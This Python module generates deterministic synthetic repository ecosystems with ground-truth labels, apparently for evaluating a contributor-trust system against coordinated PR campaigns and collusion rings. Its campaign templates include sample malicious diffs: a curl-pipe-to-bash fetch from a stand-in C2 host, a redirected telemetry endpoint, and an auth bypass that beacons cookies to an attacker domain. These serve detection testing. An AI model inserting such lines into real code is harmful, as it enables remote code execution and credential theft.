"""Ecosystem scenario generator for OpenCred simulation and evaluation.

Generates synthetic repository ecosystems with ground-truth labels for:
- Repository web-of-trust manifests with @trust-repo directives.
- Contributor histories (established, newcomer, and honest targeted contributors).
- Pull requests (legitimate PRs, coordinated campaign attacks, and false-positive traps).
- Denunciation rings of colluding repositories targeting honest contributors.
- Ground-truth annotations for precision, recall, and fairness evaluation.

All generation is strictly deterministic based on random.Random(seed).
"""

import random
from dataclasses import dataclass
from datetime import UTC, datetime, timedelta
from enum import StrEnum
from typing import Any

from pydantic import ConfigDict, Field, model_validator

from opencred.core.models import (
    ContributionEvent,
    ContributionEventKind,
    OpenCredModel,
    PullRequestRecord,
    RepoId,
    to_canonical_json,
)

# Simulation scale constants
NUM_CAMPAIGNS: int = 3
NUM_DENUNCIATION_RINGS: int = 2
NUM_ESTABLISHED: int = 30
NUM_NEWCOMERS: int = 20
NUM_HONEST_TARGETED: int = 2
NUM_TRAP_PRS: int = 10
NUM_LEGIT_PRS: int = 30


@dataclass(frozen=True)
class _CampaignTemplate:
    desc: str
    title: str
    body: str
    file: str
    diff: str
    base_time: datetime
    authors: list[str]
    repos: list[RepoId]
    base_num: int


class PRLabel(StrEnum):
    """Ground truth classification for pull requests."""

    LEGIT = "LEGIT"
    CAMPAIGN = "CAMPAIGN"
    TRAP = "TRAP"


class ContributorLabel(StrEnum):
    """Ground truth classification for contributors."""

    ESTABLISHED = "ESTABLISHED"
    NEWCOMER = "NEWCOMER"
    HONEST_TARGETED = "HONEST_TARGETED"


class GroundTruth(OpenCredModel):
    """Ground truth labels for contributors and pull requests."""

    model_config = ConfigDict(frozen=True, extra="forbid", populate_by_name=True)

    prs: dict[str, str] = Field(
        alias="prs",
        description="Mapping of PR key (repo#number) to PRLabel (LEGIT, CAMPAIGN, TRAP)",
    )
    contributors: dict[str, str] = Field(
        description=(
            "Mapping of contributor username to ContributorLabel "
            "(ESTABLISHED, NEWCOMER, HONEST_TARGETED)"
        ),
    )

    @property
    def PRs(self) -> dict[str, str]:  # noqa: N802
        """Convenience property for PRs alias."""
        return self.prs

    @model_validator(mode="before")
    @classmethod
    def _handle_prs_alias(cls, data: Any) -> Any:
        if isinstance(data, dict):
            if "PRs" in data and "prs" not in data:
                data = dict(data)
                data["prs"] = data["PRs"]
        return data

    def __getitem__(self, key: str) -> Any:
        if key == "PRs":
            return self.prs
        return getattr(self, key)


class CampaignScenario(OpenCredModel):
    """Metadata describing a coordinated multi-account campaign."""

    campaign_id: str
    description: str
    authors: list[str]
    repositories: list[RepoId]
    pr_keys: list[str]


class DenunciationRingScenario(OpenCredModel):
    """Metadata describing a ring of colluding repositories denouncing an honest contributor."""

    ring_id: str
    target_contributor: str
    repositories: list[RepoId]


class Scenario(OpenCredModel):
    """Full ecosystem simulation scenario with ground truth annotations.

    JSON-serializable data model containing repositories, manifests,
    contributor histories, PRs, campaigns, denunciation rings,
    false-positive traps, and ground truth labels.
    """

    model_config = ConfigDict(frozen=True, extra="forbid", populate_by_name=True)

    repositories: list[RepoId]
    manifests: dict[str, str]
    contributors: dict[str, list[ContributionEvent]]
    prs: list[PullRequestRecord] = Field(
        alias="prs",
        description="Full collection of pull request records under assessment",
    )
    campaigns: list[CampaignScenario]
    denunciation_rings: list[DenunciationRingScenario]
    false_positive_traps: list[PullRequestRecord]
    ground_truth: GroundTruth

    @property
    def PRs(self) -> list[PullRequestRecord]:  # noqa: N802
        """Convenience property for PRs alias."""
        return self.prs

    @model_validator(mode="before")
    @classmethod
    def _handle_prs_alias(cls, data: Any) -> Any:
        if isinstance(data, dict):
            if "PRs" in data and "prs" not in data:
                data = dict(data)
                data["prs"] = data["PRs"]
        return data

    def __getitem__(self, key: str) -> Any:
        if key == "PRs":
            return self.prs
        return getattr(self, key)


def generate_scenario(seed: int, num_repos: int = 30) -> Scenario:
    """Generate a reproducible, deterministic synthetic ecosystem scenario.

    Args:
        seed: Randomness seed. Randomness comes solely from random.Random(seed).
        num_repos: Total number of repositories in the ecosystem (minimum 12).

    Returns:
        Scenario: JSON-serializable ecosystem scenario with ground-truth labels.
    """
    if num_repos < 12:
        msg = (
            "num_repos must be at least 12 to accommodate denunciation rings "
            f"(8 repos) and 4 distinct campaign repositories, got {num_repos}"
        )
        raise ValueError(msg)

    rng = random.Random(seed)

    # 1. Repositories
    repos = [RepoId(f"repo-{i:02d}/pkg-{i:02d}") for i in range(num_repos)]
    repos.sort()

    # 2. Denunciation Rings & Honest Targeted Contributors
    # Ring 0: repos[0:4] collude and denounce honest_target_0
    # Ring 1: repos[4:8] collude and denounce honest_target_1
    ring_0_repos = repos[0:4]
    ring_1_repos = repos[4:8]
    honest_targets = ["honest_target_0", "honest_target_1"]

    ring_0 = DenunciationRingScenario(
        ring_id="ring_0",
        target_contributor=honest_targets[0],
        repositories=ring_0_repos,
    )
    ring_1 = DenunciationRingScenario(
        ring_id="ring_1",
        target_contributor=honest_targets[1],
        repositories=ring_1_repos,
    )
    denunciation_rings = [ring_0, ring_1]

    # 3. Contributors & Historical Events
    # 30 Established (60%), 20 Newcomers (40%), 2 Honest Targeted
    established_usernames = [f"established_{i:02d}" for i in range(NUM_ESTABLISHED)]
    newcomer_usernames = [f"newcomer_{i:02d}" for i in range(NUM_NEWCOMERS)]

    contributors_history: dict[str, list[ContributionEvent]] = {}
    gt_contributors: dict[str, str] = {}

    # Established contributors: history of merged and reviewed PRs in honest repos
    base_history_date = datetime(2026, 8, 1, 0, 0, 0, tzinfo=UTC)
    honest_repos = repos[8:]

    for user in established_usernames:
        gt_contributors[user] = ContributorLabel.ESTABLISHED.value
        num_events = rng.randint(3, 7)
        user_events: list[ContributionEvent] = []
        for ev_idx in range(num_events):
            ev_date = base_history_date + timedelta(
                days=rng.randint(1, 60),
                hours=rng.randint(0, 23),
                minutes=rng.randint(0, 59),
            )
            # Ensure at least the first event is MERGED
            kind = (
                ContributionEventKind.MERGED
                if ev_idx == 0
                else rng.choice(
                    [ContributionEventKind.MERGED, ContributionEventKind.ADDRESSED_REVIEW]
                )
            )
            ev_repo = rng.choice(honest_repos)
            user_events.append(
                ContributionEvent(
                    subject=user,
                    repo=ev_repo,
                    kind=kind,
                    occurred_at=ev_date,
                )
            )
        user_events.sort(key=lambda ev: ev.occurred_at)
        contributors_history[user] = user_events

    # Honest targeted contributors: solid positive history in honest repos
    for ht_user in honest_targets:
        gt_contributors[ht_user] = ContributorLabel.HONEST_TARGETED.value
        ht_events: list[ContributionEvent] = []
        for ev_idx in range(5):
            ev_date = base_history_date + timedelta(
                days=10 + ev_idx * 8,
                hours=12,
            )
            ht_events.append(
                ContributionEvent(
                    subject=ht_user,
                    repo=honest_repos[ev_idx % len(honest_repos)],
                    kind=ContributionEventKind.MERGED,
                    occurred_at=ev_date,
                )
            )
        ht_events.sort(key=lambda ev: ev.occurred_at)
        contributors_history[ht_user] = ht_events

    # Newcomers: empty history (no prior merged events)
    for user in newcomer_usernames:
        gt_contributors[user] = ContributorLabel.NEWCOMER.value
        contributors_history[user] = []

    # 4. Manifests
    manifests: dict[str, str] = {}
    for repo in repos:
        lines: list[str] = [
            f"# OpenCred trust manifest for {repo}",
        ]

        if repo in ring_0_repos:
            # Ring 0 mutual trust and denunciation of honest_target_0
            for peer in ring_0_repos:
                if peer != repo:
                    lines.append(f"# @trust-repo {peer} weight=0.90")
            lines.append(f"- {honest_targets[0]} malicious ring target")
        elif repo in ring_1_repos:
            # Ring 1 mutual trust and denunciation of honest_target_1
            for peer in ring_1_repos:
                if peer != repo:
                    lines.append(f"# @trust-repo {peer} weight=0.90")
            lines.append(f"- {honest_targets[1]} coordinated smear target")
        else:
            # Honest repository: trust 2 other honest repos and vouch for honest contributors
            other_honest = [r for r in honest_repos if r != repo]
            trusted_peers = rng.sample(other_honest, min(2, len(other_honest)))
            trusted_peers.sort()
            for peer in trusted_peers:
                weight = 0.80 + (rng.randint(0, 3) * 0.05)
                lines.append(f"# @trust-repo {peer} weight={weight:.2f}")

            # Honest repos vouch for some established contributors and honest targets
            vouches = [
                established_usernames[rng.randint(0, len(established_usernames) - 1)],
                honest_targets[0],
            ]
            vouches.sort()
            for vouch_user in sorted(set(vouches)):
                lines.append(vouch_user)

        manifests[str(repo)] = "\n".join(lines) + "\n"

    # 5. Campaigns
    # 3 coordinated campaigns, each involving 6 new accounts across 4+ repositories
    # Submitting near-identical PRs within the campaign window (CAMPAIGN_WINDOW_HOURS = 6h)
    campaigns: list[CampaignScenario] = []
    campaign_prs: list[PullRequestRecord] = []
    gt_prs: dict[str, str] = {}

    def _select_campaign_repos(offset: int) -> list[RepoId]:
        distinct_4 = [honest_repos[(offset + k) % len(honest_repos)] for k in range(4)]
        return [
            distinct_4[0],
            distinct_4[1],
            distinct_4[2],
            distinct_4[3],
            distinct_4[0],
            distinct_4[1],
        ]

    campaign_templates: list[_CampaignTemplate] = [
        _CampaignTemplate(
            desc="Cryptocurrency wallet stealer injection",
            title="Fix memory safety issue in parser engine",
            body="Fixes critical bounds issue in input parser. Urgent review requested.",
            file="src/parser/engine.c",
            diff=(
                "- int size = 64;\n"
                "+ int size = 1024;\n"
                "+ // inject payload\n"
                '+ system("curl -s https://evil-c2.example.com/payload.sh | bash");'
            ),
            base_time=datetime(2026, 10, 10, 2, 0, 0, tzinfo=UTC),
            authors=newcomer_usernames[0:6],
            repos=_select_campaign_repos(0),
            base_num=100,
        ),
        _CampaignTemplate(
            desc="Telemetry backchannel diversion",
            title="Update telemetry metrics endpoint",
            body="Synchronize diagnostic telemetry metrics with cluster endpoint.",
            file="src/telemetry/reporter.py",
            diff=(
                "- METRICS_URL = 'https://telemetry.internal.org'\n"
                "+ METRICS_URL = 'https://collector.campaign-sweep.net/metrics'"
            ),
            base_time=datetime(2026, 10, 12, 14, 0, 0, tzinfo=UTC),
            authors=newcomer_usernames[6:12],
            repos=_select_campaign_repos(1),
            base_num=200,
        ),
        _CampaignTemplate(
            desc="Authentication bypass token harvest",
            title="Enhance session cookie validation",
            body="Improve authentication session longevity under concurrent token refresh.",
            file="src/auth/session.ts",
            diff=(
                "+ // Coordinated authentication bypass token harvest\n"
                "+ if (process.env.DEBUG_BYPASS) return true;\n"
                "+ navigator.sendBeacon('https://token-drop.example.com', cookie);"
            ),
            base_time=datetime(2026, 10, 14, 18, 0, 0, tzinfo=UTC),
            authors=newcomer_usernames[12:18],
            repos=_select_campaign_repos(2),
            base_num=300,
        ),
    ]

    for c_idx, c_data in enumerate(campaign_templates):
        c_id = f"campaign_{c_idx}"
        c_keys: list[str] = []
        c_repos_set = sorted(set(c_data.repos))

        for pr_idx in range(6):
            target_repo = c_data.repos[pr_idx]
            pr_author = c_data.authors[pr_idx]
            pr_num = c_data.base_num + pr_idx
            pr_time = c_data.base_time + timedelta(minutes=pr_idx * 15)

            pr = PullRequestRecord(
                repo=target_repo,
                number=pr_num,
                author=pr_author,
                opened_at=pr_time,
                title=c_data.title,
                body=c_data.body,
                changed_files=[c_data.file],
                normalized_diff=c_data.diff,
                linked_issue_numbers=[],
                external_links=[],
            )
            campaign_prs.append(pr)
            key = f"{target_repo}#{pr_num}"
            c_keys.append(key)
            gt_prs[key] = PRLabel.CAMPAIGN.value

        campaigns.append(
            CampaignScenario(
                campaign_id=c_id,
                description=c_data.desc,
                authors=list(c_data.authors),
                repositories=c_repos_set,
                pr_keys=sorted(c_keys),
            )
        )

    # 6. False Positive Traps
    # Ordinary, legitimate PRs that look similar across repos (e.g. dependency bumps)
    false_positive_traps: list[PullRequestRecord] = []

    # 5 Dependency bumps across distinct honest repos
    dep_bump_time = datetime(2026, 10, 16, 8, 0, 0, tzinfo=UTC)
    for i in range(5):
        target_repo = honest_repos[i % len(honest_repos)]
        pr_num = 400 + i
        pr = PullRequestRecord(
            repo=target_repo,
            number=pr_num,
            author=established_usernames[0],
            opened_at=dep_bump_time + timedelta(minutes=i * 20),
            title="Bump lodash from 4.17.20 to 4.17.21",
            body="Bumps lodash from 4.17.20 to 4.17.21. Includes upstream vulnerability patch.",
            changed_files=["package.json", "package-lock.json"],
            normalized_diff='-   "lodash": "4.17.20"\n+   "lodash": "4.17.21"',
            linked_issue_numbers=[],
            external_links=[],
        )
        false_positive_traps.append(pr)
        gt_prs[f"{target_repo}#{pr_num}"] = PRLabel.TRAP.value

    # 5 Typo fixes across distinct honest repos
    typo_fix_time = datetime(2026, 10, 18, 10, 0, 0, tzinfo=UTC)
    for i in range(5):
        target_repo = honest_repos[(i + 1) % len(honest_repos)]
        pr_num = 500 + i
        pr = PullRequestRecord(
            repo=target_repo,
            number=pr_num,
            author=established_usernames[1],
            opened_at=typo_fix_time + timedelta(minutes=i * 25),
            title="Fix typo in README.md",
            body="Corrects typographical error in the installation section.",
            changed_files=["README.md"],
            normalized_diff="- instllation\n+ installation",
            linked_issue_numbers=[],
            external_links=[],
        )
        false_positive_traps.append(pr)
        gt_prs[f"{target_repo}#{pr_num}"] = PRLabel.TRAP.value

    # 7. Ordinary Legitimate PRs (LEGIT)
    legit_prs: list[PullRequestRecord] = []
    base_legit_time = datetime(2026, 10, 20, 0, 0, 0, tzinfo=UTC)

    # 30 diverse PRs submitted by established authors and legitimate newcomers
    legit_authors = established_usernames[2:] + newcomer_usernames[18:20]

    for i in range(NUM_LEGIT_PRS):
        pr_author = legit_authors[i % len(legit_authors)]
        target_repo = honest_repos[i % len(honest_repos)]
        pr_num = 1000 + i
        pr_time = base_legit_time + timedelta(hours=i * 4)

        pr = PullRequestRecord(
            repo=target_repo,
            number=pr_num,
            author=pr_author,
            opened_at=pr_time,
            title=f"Add feature implementation {i:02d}",
            body=f"Implements routine feature enhancement component {i:02d}.",
            changed_files=[f"src/features/component_{i:02d}.py"],
            normalized_diff=f"+ def component_{i:02d}():\n+     return True",
            linked_issue_numbers=[i + 1],
            external_links=[],
        )
        legit_prs.append(pr)
        gt_prs[f"{target_repo}#{pr_num}"] = PRLabel.LEGIT.value

    # Combine and sort all PRs deterministically
    all_prs = campaign_prs + false_positive_traps + legit_prs
    all_prs.sort(key=lambda p: (str(p.repo), p.number))
    false_positive_traps.sort(key=lambda p: (str(p.repo), p.number))

    ground_truth = GroundTruth(
        prs=gt_prs,
        contributors=gt_contributors,
    )

    return Scenario(
        repositories=repos,
        manifests=manifests,
        contributors=contributors_history,
        prs=all_prs,
        campaigns=campaigns,
        denunciation_rings=denunciation_rings,
        false_positive_traps=false_positive_traps,
        ground_truth=ground_truth,
    )


__all__ = [
    "CampaignScenario",
    "ContributorLabel",
    "DenunciationRingScenario",
    "GroundTruth",
    "NUM_CAMPAIGNS",
    "NUM_DENUNCIATION_RINGS",
    "NUM_ESTABLISHED",
    "NUM_HONEST_TARGETED",
    "NUM_LEGIT_PRS",
    "NUM_NEWCOMERS",
    "NUM_TRAP_PRS",
    "PRLabel",
    "Scenario",
    "generate_scenario",
    "to_canonical_json",
]
